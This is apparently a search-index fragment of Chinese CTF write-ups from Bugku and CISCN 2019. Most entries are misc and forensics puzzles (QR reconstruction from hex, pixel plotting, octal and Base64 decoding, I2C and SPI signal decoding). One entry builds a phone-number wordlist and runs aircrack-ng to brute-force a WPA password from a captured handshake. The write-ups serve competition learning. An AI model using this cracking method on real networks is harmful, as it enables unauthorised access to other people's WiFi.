\u5c1d\u8bd5\u7740\u5c06\u5176\u8f6c\u4e3aASCII\uff0c\u53d1\u73b0\u662f\u4e00\u5806\u5750\u6807\uff0c\u4f30\u8ba1\u53ef\u4ee5\u753b\u51fa\u4e00\u4e2a\u4e8c\u7ef4\u7801\uff0c\u4e8e\u662f\u4ee3\u7801\u8d70\u8d77\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include <fstream> #include <sstream> #include <opencv2/opencv.hpp> int main () { std :: ifstream inputFileStream ( \"./paintpaintpaint.jpg\" ); std :: stringstream ss ; while ( ! inputFileStream . eof ()) { char ch1 , ch2 ; inputFileStream >> ch1 >> ch2 ; ch1 = ( 'a' <= ch1 && ch1 <= 'f' ) ? ( ch1 - 'a' ) : ( ch1 - '0' ); ch2 = ( 'a' <= ch2 && ch2 <= 'f' ) ? ( ch2 - 'a' ) : ( ch2 - '0' ); char ch = ( ch1 << 4 ) + ch2 ; ss << (( '0' <= ch && ch <= '9' ) ? ch : ' ' ); } cv :: Mat img ( 300 , 300 , CV_8UC1 , cv :: Scalar ( 255 )); while ( ! ss . eof ()) { int row , col ; ss >> row >> col ; img . at < uchar > ( row , col ) = 0 ; } cv :: imwrite ( \"output.png\" , img ); return 0 ; } \u5f97\u5230\u4e00\u4e2a\u4e8c\u7ef4\u7801\uff1a \u626b\u4e00\u4e0b\uff1a 1 flag { 40 fc0a979f759c8892f4dc045e28b820 }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/\u597d\u591a\u6570\u503c/","text":"flag\u683c\u5f0f flag{} 1.txt \u5b58\u6863\uff1a 1.txt \u89e3\u51b3\u65b9\u6848 \u4e0b\u8f7d\u5230\u5f88\u591a\u4e09\u4e2a\u6570\u4e00\u884c\u7684\u6570\u636e\uff0c\u6bcf\u4e2a\u90fd\u4e0d\u8d85\u8fc7255\uff0c\u770b\u8d77\u6765\u50cf\u662f\u56fe\u7247\u50cf\u7d20\u70b9\uff0c\u5c1d\u8bd5\u8d28\u56e0\u6570\u5206\u89e3\uff0c\u7136\u540e\u753b\u51fa\u6765\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include <fstream> #include <sstream> #include <vector> #include <opencv2/opencv.hpp> int main () { const int WIDTH = 503 , HEIGHT = 122 ; std :: ifstream inputFileStream ( \"./1.txt\" ); cv :: Mat img ( cv :: Size ( WIDTH , HEIGHT ), CV_8UC3 ); char buffer [ 64 ]; for ( int ic = 0 ; ic < WIDTH ; ++ ic ) { for ( int ir = 0 ; ir < HEIGHT ; ++ ir ) { inputFileStream . getline ( buffer , 60 ); std :: stringstream ss ( buffer ); std :: vector < int > value ( 3 ); for ( int i = 0 ; i < 3 ; ++ i ) { ss >> value [ i ]; if ( ss . peek () == ',' ) { ss . ignore (); } } img . at < cv :: Vec3b > ( ir , ic ) = cv :: Vec3b ( cv :: saturate_cast < uchar > ( value [ 2 ]), cv :: saturate_cast < uchar > ( value [ 1 ]), cv :: saturate_cast < uchar > ( value [ 0 ])); } } cv :: imwrite ( \"1.png\" , img ); return 0 ; } \u8fd0\u884c\u4e00\u4e0b\uff1a \u55ef...\u8865\u5145\u4e00\u4e0b\uff0c\u6587\u6863\u670961136=2*61*503\u884c\uff08\u76f4\u63a5\u4e22\u5230wolframalpha.com\u7b97\uff0c\u5b89\u5229\u4e00\u4e0b\uff09\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5404\u79cd\u5bbd\u9ad8\u7ec4\u5408\u6765\u753b\u51fa\u56fe\u7247\uff0c\u8fd9\u56de\u50cf\u7d20\u70b9\u662f\u4e00\u5217\u4e00\u5217\u6765\u753b\u7684\u6709\u70b9\u5c0f\u5751...\uff08\u4e0d\u8fc7\u5e94\u8be5\u662f\u6211\u6bd4\u8f83\u83dc\uff09","title":"\u597d\u591a\u6570\u503c"},{"location":"ctf_writeup/bugku/\u597d\u591a\u6570\u503c/#_1","text":"\u4e0b\u8f7d\u5230\u5f88\u591a\u4e09\u4e2a\u6570\u4e00\u884c\u7684\u6570\u636e\uff0c\u6bcf\u4e2a\u90fd\u4e0d\u8d85\u8fc7255\uff0c\u770b\u8d77\u6765\u50cf\u662f\u56fe\u7247\u50cf\u7d20\u70b9\uff0c\u5c1d\u8bd5\u8d28\u56e0\u6570\u5206\u89e3\uff0c\u7136\u540e\u753b\u51fa\u6765\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include <fstream> #include <sstream> #include <vector> #include <opencv2/opencv.hpp> int main () { const int WIDTH = 503 , HEIGHT = 122 ; std :: ifstream inputFileStream ( \"./1.txt\" ); cv :: Mat img ( cv :: Size ( WIDTH , HEIGHT ), CV_8UC3 ); char buffer [ 64 ]; for ( int ic = 0 ; ic < WIDTH ; ++ ic ) { for ( int ir = 0 ; ir < HEIGHT ; ++ ir ) { inputFileStream . getline ( buffer , 60 ); std :: stringstream ss ( buffer ); std :: vector < int > value ( 3 ); for ( int i = 0 ; i < 3 ; ++ i ) { ss >> value [ i ]; if ( ss . peek () == ',' ) { ss . ignore (); } } img . at < cv :: Vec3b > ( ir , ic ) = cv :: Vec3b ( cv :: saturate_cast < uchar > ( value [ 2 ]), cv :: saturate_cast < uchar > ( value [ 1 ]), cv :: saturate_cast < uchar > ( value [ 0 ])); } } cv :: imwrite ( \"1.png\" , img ); return 0 ; } \u8fd0\u884c\u4e00\u4e0b\uff1a \u55ef...\u8865\u5145\u4e00\u4e0b\uff0c\u6587\u6863\u670961136=2*61*503\u884c\uff08\u76f4\u63a5\u4e22\u5230wolframalpha.com\u7b97\uff0c\u5b89\u5229\u4e00\u4e0b\uff09\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5404\u79cd\u5bbd\u9ad8\u7ec4\u5408\u6765\u753b\u51fa\u56fe\u7247\uff0c\u8fd9\u56de\u50cf\u7d20\u70b9\u662f\u4e00\u5217\u4e00\u5217\u6765\u753b\u7684\u6709\u70b9\u5c0f\u5751...\uff08\u4e0d\u8fc7\u5e94\u8be5\u662f\u6211\u6bd4\u8f83\u83dc\uff09","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/\u60f3\u8e6d\u7f51\u5148\u89e3\u5f00\u5bc6\u7801/","text":"flag\u683c\u5f0f\uff1aflag{\u4f60\u7834\u89e3\u7684WiFi\u5bc6\u7801} tips\uff1a\u5bc6\u7801\u4e3a\u624b\u673a\u53f7\uff0c\u4e3a\u4e86\u4e0d\u4e3a\u96be\u4f60\uff0c\u5927\u4f6c\u7279\u5730\u8ba9\u6211\u6084\u6084\u5730\u628a\u524d\u4e03\u4f4d\u544a\u8bc9\u4f60 1391040** Goodluck!! \u4f5c\u8005@NewBee wifi.cap \u5b58\u6863\uff1a wifi.cap \u89e3\u51b3\u65b9\u6848 \u5148\u7784\u4e00\u773c\u91cc\u9762\u6709\u5565\uff1a \u6839\u636eHint\uff0c\u51c6\u5907\u4e00\u4e0b\u5b57\u5178\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 #include <fstream> #include <iomanip> int main () { std :: ofstream outputFileStream ( \"./dict_1391040xxxx.txt\" ); for ( size_t i = 0 ; i < 10000 ; ++ i ) { outputFileStream << \"1391040\" << std :: setw ( 4 ) << std :: setfill ( '0' ) << i << std :: endl ; } return 0 ; } \u7136\u540e\u53ef\u4ee5\u5f00\u59cb\u7206\u7834\u4e86\uff1a 1 aircrack - ng - w . / dict_1391040xxxx . txt . / wifi . cap \u5f88\u5feb\u5c31\u5f97\u624b\u4e86\uff1a","title":"\u60f3\u8e6d\u7f51\u5148\u89e3\u5f00\u5bc6\u7801"},{"location":"ctf_writeup/bugku/\u60f3\u8e6d\u7f51\u5148\u89e3\u5f00\u5bc6\u7801/#_1","text":"\u5148\u7784\u4e00\u773c\u91cc\u9762\u6709\u5565\uff1a \u6839\u636eHint\uff0c\u51c6\u5907\u4e00\u4e0b\u5b57\u5178\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 #include <fstream> #include <iomanip> int main () { std :: ofstream outputFileStream ( \"./dict_1391040xxxx.txt\" ); for ( size_t i = 0 ; i < 10000 ; ++ i ) { outputFileStream << \"1391040\" << std :: setw ( 4 ) << std :: setfill ( '0' ) << i << std :: endl ; } return 0 ; } \u7136\u540e\u53ef\u4ee5\u5f00\u59cb\u7206\u7834\u4e86\uff1a 1 aircrack - ng - w . / dict_1391040xxxx . txt . / wifi . cap \u5f88\u5feb\u5c31\u5f97\u624b\u4e86\uff1a","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/\u666e\u901a\u7684\u4e8c\u7ef4\u7801/","text":"\u6765\u6e90\uff1aXJNU misc80.zip \u5b58\u6863\uff1a misc80.zip \u89e3\u51b3\u65b9\u6848 \u89e3\u538b\u538b\u7f29\u5305\uff0c\u53ef\u4ee5\u62ff\u5230\u4e00\u4e2a\u4e8c\u7ef4\u7801\u56fe\u7247\u3002\u4e0d\u51fa\u6240\u6599\uff0c\u626b\u4e0d\u51fa\u4ec0\u4e48\u4e1c\u897f\uff1a \u54c8\u54c8!\u5c31\u4e0d\u544a\u8bc9\u4f60flag\u5c31\u5728\u8fd9\u91cc! binwalk\u4ec0\u4e48\u7684\u7784\u4e00\u773c...\u6ca1\u6709\u4ec0\u4e48\u7ed3\u679c\uff0c\u4e0d\u8fc7\uff1a 1 strings . / misc100 . bmp \u5f97\u5230\u4e86\uff1a 1 146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175 @xjseck ! \u6570\u5b57\u5f88\u53ef\u7591\uff0c\u770b\u8d77\u6765\u50cf\u662f\u516b\u8fdb\u5236\uff0c\u5c1d\u8bd5\u7740\u516b\u8fdb\u5236\u8f6cASCII\uff1a 1 flag { Have_y0U_Py_script_Otc_To_Ten_Ascii ! }","title":"\u666e\u901a\u7684\u4e8c\u7ef4\u7801"},{"location":"ctf_writeup/bugku/\u666e\u901a\u7684\u4e8c\u7ef4\u7801/#_1","text":"\u89e3\u538b\u538b\u7f29\u5305\uff0c\u53ef\u4ee5\u62ff\u5230\u4e00\u4e2a\u4e8c\u7ef4\u7801\u56fe\u7247\u3002\u4e0d\u51fa\u6240\u6599\uff0c\u626b\u4e0d\u51fa\u4ec0\u4e48\u4e1c\u897f\uff1a \u54c8\u54c8!\u5c31\u4e0d\u544a\u8bc9\u4f60flag\u5c31\u5728\u8fd9\u91cc! binwalk\u4ec0\u4e48\u7684\u7784\u4e00\u773c...\u6ca1\u6709\u4ec0\u4e48\u7ed3\u679c\uff0c\u4e0d\u8fc7\uff1a 1 strings . / misc100 . bmp \u5f97\u5230\u4e86\uff1a 1 146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175 @xjseck ! \u6570\u5b57\u5f88\u53ef\u7591\uff0c\u770b\u8d77\u6765\u50cf\u662f\u516b\u8fdb\u5236\uff0c\u5c1d\u8bd5\u7740\u516b\u8fdb\u5236\u8f6cASCII\uff1a 1 flag { Have_y0U_Py_script_Otc_To_Ten_Ascii ! }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/\u732b\u7247(\u5b89\u6052)/","text":"png \u5b58\u6863\uff1a png \u89e3\u51b3\u65b9\u6848 \u6839\u636eHint\uff0c\u76f4\u63a5StegSolve\u6253\u5f00\u56fe\u7247\u7136\u540eAnalyse->Data Extract\uff0c\u770b\u5230\u4e86\u719f\u6089\u7684PNG\u5934\uff1a","title":"\u732b\u7247(\u5b89\u6052)"},{"location":"ctf_writeup/bugku/\u732b\u7247(\u5b89\u6052)/#_1","text":"\u6839\u636eHint\uff0c\u76f4\u63a5StegSolve\u6253\u5f00\u56fe\u7247\u7136\u540eAnalyse->Data Extract\uff0c\u770b\u5230\u4e86\u719f\u6089\u7684PNG\u5934\uff1a","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/bugku/\u7ec6\u5fc3\u7684\u5927\u8c61/","text":"https://share.weiyun.com/9287be0a629971ac53d97f39727eee18 \u5b58\u6863\uff1a 1.jpg.zip \u89e3\u51b3\u65b9\u6848 \u89e3\u538b\u5f97\u5230\u4e00\u4e2a\u76f8\u5bf9\u6bd4\u8f83\u5927\u7684\u56fe\u7247\uff0cforemost\u5f97\u5230\u4e86\u4e00\u4e2arar\uff0c\u6709\u5bc6\u7801\u3002\u4e0d\u8fc7\u5728\u56fe\u7247\u5c5e\u6027\u4e0a\u53ef\u4ee5\u770b\u5230\uff1a 1 TVNEUzQ1NkFTRDEyM3p6 BASE64\u89e3\u5f00\u4e00\u4e0b\uff1a 1 MSDS456ASD123zz \u597d\u50cf\u633a\u6709\u89c4\u5f8b...\u62ff\u53bb\u89e3\u538b\u5f97\u5230\u4e86\u4e00\u4e2a2.png\uff0c\u5f88\u719f\u6089\u7684\u56fe\u7247\uff0c\u8fd8\u662f\u6539\u9ad8\u5ea6\uff1a","title":"\u7ec6\u5fc3\u7684\u5927\u8c61"},{"location":"ctf_writeup/bugku/\u7ec6\u5fc3\u7684\u5927\u8c61/#_1","text":"\u89e3\u538b\u5f97\u5230\u4e00\u4e2a\u76f8\u5bf9\u6bd4\u8f83\u5927\u7684\u56fe\u7247\uff0cforemost\u5f97\u5230\u4e86\u4e00\u4e2arar\uff0c\u6709\u5bc6\u7801\u3002\u4e0d\u8fc7\u5728\u56fe\u7247\u5c5e\u6027\u4e0a\u53ef\u4ee5\u770b\u5230\uff1a 1 TVNEUzQ1NkFTRDEyM3p6 BASE64\u89e3\u5f00\u4e00\u4e0b\uff1a 1 MSDS456ASD123zz \u597d\u50cf\u633a\u6709\u89c4\u5f8b...\u62ff\u53bb\u89e3\u538b\u5f97\u5230\u4e86\u4e00\u4e2a2.png\uff0c\u5f88\u719f\u6089\u7684\u56fe\u7247\uff0c\u8fd8\u662f\u6539\u9ad8\u5ea6\uff1a","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/cg_ctf/easyweb/","text":"","title":"\u7b7e\u5230\u9898"},{"location":"ctf_writeup/ciscn_2019/24c/","text":"\u9898\u76ee \u8fd8\u6ca1\u6709\u65f6\u95f4\u6574\u7406\u8fd9\u91cc \u6000\u7740\u5bf9AoiSystem\u7684\u597d\u5947\u5fc3\uff0c\u4f60\u4e5f\u8d2d\u4e70\u4e86\u4e00\u53f0\u4ed6\u4eec\u7684\u4ea7\u54c1\u3002\u5c06\u201c\u67d0\u4e2a\u4eea\u5668\u201d\u8fde\u63a5\u5230\u8be5\u4ea7\u54c1\u7684\u4e00\u4e2a\u82af\u7247\u4e0a\uff0c\u4eea\u5668\u8bb0\u5f55\u4e0b\u4e86\u4ee5\u4e0b\u7684\u6570\u636e\u3002 \u8bf7\u4e0b\u8f7d\u9644\u4ef6(\u63d0\u53d6\u7801\uff1a4dme) \u5907\u7528\u4e0b\u8f7d \u9898\u76ee\u5b58\u6863\uff1a 24c.zip \u89e3\u51b3\u65b9\u6848 \u8fd8\u662f\u7528saleae\u7684\u8f6f\u4ef6\u6253\u5f00\u3002\u4e24\u4e2a\u901a\u9053\uff0c\u4e00\u4e2a\u65f6\u949f\u7ebf\u4e00\u4e2a\u6570\u636e\u7ebf\uff0c\u6709\u79cd\u50cf\u662fI2C\u7684\u611f\u89c9\u3002\u53f3\u8fb9\u6709\u4e2a Analyzers \uff0c\u70b9\u51fb\u5b83\u7684\u52a0\u53f7\uff0c\u9009\u4e2dI2C\uff0c Decoded Protocols \u91cc\u5e94\u8be5\u4f1a\u663e\u793a\u89e3\u7801\u540e\u7684\u6570\u636e\uff0c\u5c31\u50cf\u8fd9\u6837\uff1a \u5148\u5bf9\u8bbe\u59070xA0 \u7684\u5730\u57400x20 \u5199\u5165 f163bdf4e}'\\0' \u518d\u5bf9\u8bbe\u59070xA1 \u987a\u5e8f\u8bfb\u53d6 flag{c46d9e10-e9b5-4d90-a883-41c \u5176\u4e2dc\u6709NAK\u54cd\u5e94 \u53ef\u80fd\u4e0d\u53ef\u9760 \u6700\u540e\u5bf9\u8bbe\u59070xA0 \u7684\u5730\u57400x09\u5199\u5165 ac \u5e94\u8be5\u662f f163bdfac}'\\0' \u62fc\u63a5\u540e\u53ef\u80fd\u662fflag{c46d9e10-e9b5-4d90-a883-41cf163bdfac} flag{c46dac10-e9b5-4d90-a883-41c \u6700\u540e\u662f flag{c46dac10-e9b5-4d90-a883-41cf163bdf4e} \u4f46\u662f\u76ee\u524d\u63d0\u4ea4\u4e0d\u5bf9 i2c\u4fe1\u865f\u7684ACK\u8207NACK 20150716\u770b\u5230\u9019\u88cf\u6709\u9ede\u5947\u602a\uff0ci2c write\u662f\u4ee5ack+stop\u7d50\u675f\u901a\u4fe1\uff0c\u800ci2c read\u662f\u4ee5nack+stop\u7d50\u675f\u901a\u4fe1\u7684\uff0c\u539f\u56e0\u5982\u4e0b\uff1a i2c write\u7684\u6642\u5019\uff0cmaster\u5728\u5beb\u5b8c\u6700\u5f8c\u4e00\u500b\u5b57\u7bc0\u4e4b\u5f8cslave\u6703\u56deACK\uff0c\u7136\u5f8cmaster\u767c\u9001stop\u4fe1\u865f\u7d50\u675f\u901a\u4fe1 i2c read\u7684\u6642\u5019\uff0cmaster\u5728\u63a5\u6536\u5b8cslave\u767c\u9001\u7684\u6700\u5f8c\u4e00\u500b\u5b57\u7bc0\u4e4b\u5f8c\u6703\u56deNAK\uff0c\u56e0\u7232\u9019\u500b\u6642\u5019master\u5df2\u7d93\u63a5\u6536\u5230\u8db3\u5920\u7684\u5b57\u7bc0\uff0cNAK\u544a\u8a34slave\u4e0d\u8981\u5728\u767c\u9001\u6578\u64da\u4e86\u3002","title":"24c"},{"location":"ctf_writeup/ciscn_2019/24c/#_1","text":"\u8fd8\u6ca1\u6709\u65f6\u95f4\u6574\u7406\u8fd9\u91cc \u6000\u7740\u5bf9AoiSystem\u7684\u597d\u5947\u5fc3\uff0c\u4f60\u4e5f\u8d2d\u4e70\u4e86\u4e00\u53f0\u4ed6\u4eec\u7684\u4ea7\u54c1\u3002\u5c06\u201c\u67d0\u4e2a\u4eea\u5668\u201d\u8fde\u63a5\u5230\u8be5\u4ea7\u54c1\u7684\u4e00\u4e2a\u82af\u7247\u4e0a\uff0c\u4eea\u5668\u8bb0\u5f55\u4e0b\u4e86\u4ee5\u4e0b\u7684\u6570\u636e\u3002 \u8bf7\u4e0b\u8f7d\u9644\u4ef6(\u63d0\u53d6\u7801\uff1a4dme) \u5907\u7528\u4e0b\u8f7d \u9898\u76ee\u5b58\u6863\uff1a 24c.zip","title":"\u9898\u76ee"},{"location":"ctf_writeup/ciscn_2019/24c/#_2","text":"\u8fd8\u662f\u7528saleae\u7684\u8f6f\u4ef6\u6253\u5f00\u3002\u4e24\u4e2a\u901a\u9053\uff0c\u4e00\u4e2a\u65f6\u949f\u7ebf\u4e00\u4e2a\u6570\u636e\u7ebf\uff0c\u6709\u79cd\u50cf\u662fI2C\u7684\u611f\u89c9\u3002\u53f3\u8fb9\u6709\u4e2a Analyzers \uff0c\u70b9\u51fb\u5b83\u7684\u52a0\u53f7\uff0c\u9009\u4e2dI2C\uff0c Decoded Protocols \u91cc\u5e94\u8be5\u4f1a\u663e\u793a\u89e3\u7801\u540e\u7684\u6570\u636e\uff0c\u5c31\u50cf\u8fd9\u6837\uff1a \u5148\u5bf9\u8bbe\u59070xA0 \u7684\u5730\u57400x20 \u5199\u5165 f163bdf4e}'\\0' \u518d\u5bf9\u8bbe\u59070xA1 \u987a\u5e8f\u8bfb\u53d6 flag{c46d9e10-e9b5-4d90-a883-41c \u5176\u4e2dc\u6709NAK\u54cd\u5e94 \u53ef\u80fd\u4e0d\u53ef\u9760 \u6700\u540e\u5bf9\u8bbe\u59070xA0 \u7684\u5730\u57400x09\u5199\u5165 ac \u5e94\u8be5\u662f f163bdfac}'\\0' \u62fc\u63a5\u540e\u53ef\u80fd\u662fflag{c46d9e10-e9b5-4d90-a883-41cf163bdfac} flag{c46dac10-e9b5-4d90-a883-41c \u6700\u540e\u662f flag{c46dac10-e9b5-4d90-a883-41cf163bdf4e} \u4f46\u662f\u76ee\u524d\u63d0\u4ea4\u4e0d\u5bf9 i2c\u4fe1\u865f\u7684ACK\u8207NACK 20150716\u770b\u5230\u9019\u88cf\u6709\u9ede\u5947\u602a\uff0ci2c write\u662f\u4ee5ack+stop\u7d50\u675f\u901a\u4fe1\uff0c\u800ci2c read\u662f\u4ee5nack+stop\u7d50\u675f\u901a\u4fe1\u7684\uff0c\u539f\u56e0\u5982\u4e0b\uff1a i2c write\u7684\u6642\u5019\uff0cmaster\u5728\u5beb\u5b8c\u6700\u5f8c\u4e00\u500b\u5b57\u7bc0\u4e4b\u5f8cslave\u6703\u56deACK\uff0c\u7136\u5f8cmaster\u767c\u9001stop\u4fe1\u865f\u7d50\u675f\u901a\u4fe1 i2c read\u7684\u6642\u5019\uff0cmaster\u5728\u63a5\u6536\u5b8cslave\u767c\u9001\u7684\u6700\u5f8c\u4e00\u500b\u5b57\u7bc0\u4e4b\u5f8c\u6703\u56deNAK\uff0c\u56e0\u7232\u9019\u500b\u6642\u5019master\u5df2\u7d93\u63a5\u6536\u5230\u8db3\u5920\u7684\u5b57\u7bc0\uff0cNAK\u544a\u8a34slave\u4e0d\u8981\u5728\u767c\u9001\u6578\u64da\u4e86\u3002","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/ciscn_2019/qiandao/","text":"\u9898\u76ee \u4e09\u4eba\u884c\u5fc5\u6709\u201cflag\u201d\u3002 \u8bf7\u4e0b\u8f7d\u9644\u4ef6(\u63d0\u53d6\u7801\uff1ah08q) \u5907\u7528\u4e0b\u8f7d \u9898\u76ee\u5b58\u6863\uff1a qiandao.zip \u89e3\u51b3\u65b9\u6848 \u6253\u5f00\u540e\u53d1\u73b0\u662f\u4eba\u8138\u68c0\u6d4b\u7684\u7a0b\u5e8f\uff0c\u4f30\u8ba1\u62ffPython-OpenCV\u5199\u7684\u3002\u60f3\u5230\u9898\u76ee\u8bf4\u4e09\u4eba\u884c\uff0c\u5e94\u8be5\u8981\u4e09\u4e2a\u4eba\u5728\u6444\u50cf\u5934\u524d\u5c31\u6709flag\u3002","title":"\u7b7e\u5230"},{"location":"ctf_writeup/ciscn_2019/qiandao/#_1","text":"\u4e09\u4eba\u884c\u5fc5\u6709\u201cflag\u201d\u3002 \u8bf7\u4e0b\u8f7d\u9644\u4ef6(\u63d0\u53d6\u7801\uff1ah08q) \u5907\u7528\u4e0b\u8f7d \u9898\u76ee\u5b58\u6863\uff1a qiandao.zip","title":"\u9898\u76ee"},{"location":"ctf_writeup/ciscn_2019/qiandao/#_2","text":"\u6253\u5f00\u540e\u53d1\u73b0\u662f\u4eba\u8138\u68c0\u6d4b\u7684\u7a0b\u5e8f\uff0c\u4f30\u8ba1\u62ffPython-OpenCV\u5199\u7684\u3002\u60f3\u5230\u9898\u76ee\u8bf4\u4e09\u4eba\u884c\uff0c\u5e94\u8be5\u8981\u4e09\u4e2a\u4eba\u5728\u6444\u50cf\u5934\u524d\u5c31\u6709flag\u3002","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/ciscn_2019/saleae/","text":"\u9898\u76ee \u4f60\u5728\u4e00\u4e2a\u5199\u6709\u201cAoiSystem\u5d4c\u5165\u5f0f\u201d\u7684U\u76d8\u4e0a\uff0c\u53d1\u73b0\u4e86\u8fd9\u4e2a\u6587\u4ef6\u3002 \u8bf7\u4e0b\u8f7d\u9644\u4ef6(\u63d0\u53d6\u7801\uff1abpek) \u5907\u7528\u4e0b\u8f7d \u9898\u76ee\u5b58\u6863\uff1a saleae.zip \u89e3\u51b3\u65b9\u6848 \u9ad8\u4e2d\u90a3\u4f1a\u513f\u641e\u5355\u7247\u673a\u7684\u65f6\u5019\u5c31\u542c\u8fc7saleae\u7684\u5927\u540d\uff0c\u53ea\u662f\u90a3\u4f1a\u513f\u67d0\u5b9d\u4e0a\u5c31\u5df2\u7ecf\u6709\u5404\u79cd\u4fbf\u5b9c\u8d27\u201csaleae\u903b\u8f91\u5206\u6790\u4eea\u201d\uff0c\u8d34\u7740\u4eba\u5bb6\u7684\u5546\u6807\u7528\u7740\u522b\u4eba\u7684\u8f6f\u4ef6...\u5b66\u751f199USD\u4e00\u4e2a\u57fa\u7840\u6b3e\u8fd8\u662f\u6709\u70b9\u5c0f\u8d35...\u8981\u662f\u63a5\u4e0b\u6765\u8fd8\u505a\u5d4c\u5165\u5f0f\u7684\u8bdd\u679c\u65ad\u5165\u4e00\u4e2a\u652f\u6301\u4e00\u4e0b\u597d\u4e86\u3002 \u8dd1\u9898\u8dd1\u5f97\u6709\u70b9\u8fdc...\u8fd9\u9898\u63d0\u793a\u5f97\u5f88\u660e\u663e\u4e86\uff0c\u5e76\u4e14\u89e3\u538b\u540e\u4e5f\u662f\u4e00\u4e2a .logicdata \u6587\u4ef6\uff0c\u6240\u4ee5\u7528saleae\u7684\u8f6f\u4ef6\u6253\u5f00\u5b83\uff0c\u5148\u5173\u6ce8\u8fd9\u91cc\uff1a \u653e\u5927\u4ed4\u7ec6\u770b\u770b\u89c4\u5f8b\uff1a \u770b\u8d77\u6765\u50cf\u662f\u6bcf\u4e2a\u5468\u671f\u67098\u4e2a\u9ad8\u7535\u5e73\u8109\u51b2\uff0c\u5148\u770b\u770b\u524d\u51e0\u4e2a\u5468\u671f\u7684\u53d6\u503c\uff1a 1 2 3 4 0110 0110 ==> 0 x66 ==> f 0110 1100 ==> 0 x6C ==> l 0110 0001 ==> 0 x61 ==> a 0110 0111 ==> 0 x67 ==> g \u6ca1\u9519\u4e86\uff0c\u76f4\u63a5\u641e\u51fa\u6765\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 0110 0110 0110 1100 0110 0001 0110 0111 0111 1011 0011 0001 0011 0010 0011 0000 0011 0111 0011 0001 0011 0011 0011 1001 0011 0111 0010 1101 0011 0001 0011 1001 0110 0100 0011 0001 0010 1101 0011 0100 0011 1000 0110 0101 0011 0110 0010 1101 0110 0010 0110 0101 0011 1000 0110 0011 0010 1101 0011 0111 0011 1000 0011 0100 0110 0010 0011 1000 0011 1001 0110 0001 0011 1001 0011 0101 0110 0101 0011 0000 0011 0111 0111 1101 \u8f6c\u6362\u4e00\u4e0b\u5c31\u53ef\u4ee5\u4e86\uff1a 1 flag { 12071397 - 19 d1 - 48 e6 - be8c - 784 b89a95e07 } \u4e8b\u5b9e\u4e0a\u8fd9\u4e2a\u5e94\u8be5\u6dfb\u52a0\u4e00\u4e2aSPI\u7684Analyser\uff0c\u76f4\u63a5\u5c31\u53ef\u4ee5\u770b\u5230\u4e86\uff0c\u7136\u540e\u5bfc\u51fa\u5c31OK\u3002","title":"saleae"},{"location":"ctf_writeup/ciscn_2019/saleae/#_1","text":"\u4f60\u5728\u4e00\u4e2a\u5199\u6709\u201cAoiSystem\u5d4c\u5165\u5f0f\u201d\u7684U\u76d8\u4e0a\uff0c\u53d1\u73b0\u4e86\u8fd9\u4e2a\u6587\u4ef6\u3002 \u8bf7\u4e0b\u8f7d\u9644\u4ef6(\u63d0\u53d6\u7801\uff1abpek) \u5907\u7528\u4e0b\u8f7d \u9898\u76ee\u5b58\u6863\uff1a saleae.zip","title":"\u9898\u76ee"},{"location":"ctf_writeup/ciscn_2019/saleae/#_2","text":"\u9ad8\u4e2d\u90a3\u4f1a\u513f\u641e\u5355\u7247\u673a\u7684\u65f6\u5019\u5c31\u542c\u8fc7saleae\u7684\u5927\u540d\uff0c\u53ea\u662f\u90a3\u4f1a\u513f\u67d0\u5b9d\u4e0a\u5c31\u5df2\u7ecf\u6709\u5404\u79cd\u4fbf\u5b9c\u8d27\u201csaleae\u903b\u8f91\u5206\u6790\u4eea\u201d\uff0c\u8d34\u7740\u4eba\u5bb6\u7684\u5546\u6807\u7528\u7740\u522b\u4eba\u7684\u8f6f\u4ef6...\u5b66\u751f199USD\u4e00\u4e2a\u57fa\u7840\u6b3e\u8fd8\u662f\u6709\u70b9\u5c0f\u8d35...\u8981\u662f\u63a5\u4e0b\u6765\u8fd8\u505a\u5d4c\u5165\u5f0f\u7684\u8bdd\u679c\u65ad\u5165\u4e00\u4e2a\u652f\u6301\u4e00\u4e0b\u597d\u4e86\u3002 \u8dd1\u9898\u8dd1\u5f97\u6709\u70b9\u8fdc...\u8fd9\u9898\u63d0\u793a\u5f97\u5f88\u660e\u663e\u4e86\uff0c\u5e76\u4e14\u89e3\u538b\u540e\u4e5f\u662f\u4e00\u4e2a .logicdata \u6587\u4ef6\uff0c\u6240\u4ee5\u7528saleae\u7684\u8f6f\u4ef6\u6253\u5f00\u5b83\uff0c\u5148\u5173\u6ce8\u8fd9\u91cc\uff1a \u653e\u5927\u4ed4\u7ec6\u770b\u770b\u89c4\u5f8b\uff1a \u770b\u8d77\u6765\u50cf\u662f\u6bcf\u4e2a\u5468\u671f\u67098\u4e2a\u9ad8\u7535\u5e73\u8109\u51b2\uff0c\u5148\u770b\u770b\u524d\u51e0\u4e2a\u5468\u671f\u7684\u53d6\u503c\uff1a 1 2 3 4 0110 0110 ==> 0 x66 ==> f 0110 1100 ==> 0 x6C ==> l 0110 0001 ==> 0 x61 ==> a 0110 0111 ==> 0 x67 ==> g \u6ca1\u9519\u4e86\uff0c\u76f4\u63a5\u641e\u51fa\u6765\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 